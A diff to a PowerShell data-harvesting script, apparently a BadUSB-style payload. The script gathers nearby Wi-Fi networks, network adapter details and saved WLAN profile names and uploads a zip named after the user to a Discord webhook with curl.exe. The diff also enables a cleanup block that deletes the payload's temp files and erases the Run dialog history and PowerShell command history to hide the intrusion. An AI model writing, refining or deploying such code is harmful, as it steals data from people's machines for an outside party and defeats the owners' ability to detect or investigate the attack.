@@ -167,7 +167,7 @@ $StartUp = StartUp
 
 function NearbyWifi {
 
-    $NearbyWifi = (netsh wlan show networks mode=Bssid)
+    $NearbyWifi = (netsh wlan show networks mode=Bssid) | Format-Table -autosize | Out-String -width 250
 
         if($NearbyWifi -gt $null) {
 
@@ -285,10 +285,10 @@ $ScheduledTasks = Get-ScheduledTask
 
 #Network Information
 #Network Interfaces
-$NetInt = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
+$NetInt = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
 
 #All WLAN profile names
-$ALLWLAN = netsh.exe wlan show profiles | Select-String -pattern " : "
+$ALLWLAN = netsh.exe wlan show profiles | Select-String -pattern " : " | Out-String -width 250
 
 ######################################################################################################################################################################
 
@@ -470,10 +470,10 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 Upload-Discord -file "$env:tmp/$env:USERNAME-Harvester.zip"
 
 ######################################################################################################################################################################
-<#
+
 #Clean UP
 #Clear temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+rm $env:tmp\$env:USERNAME* -r -Force -ErrorAction SilentlyContinue
 
 #Clear run history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
@@ -483,4 +483,4 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 #Clear recycle bin (not currently in use)
 #Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-#>
+
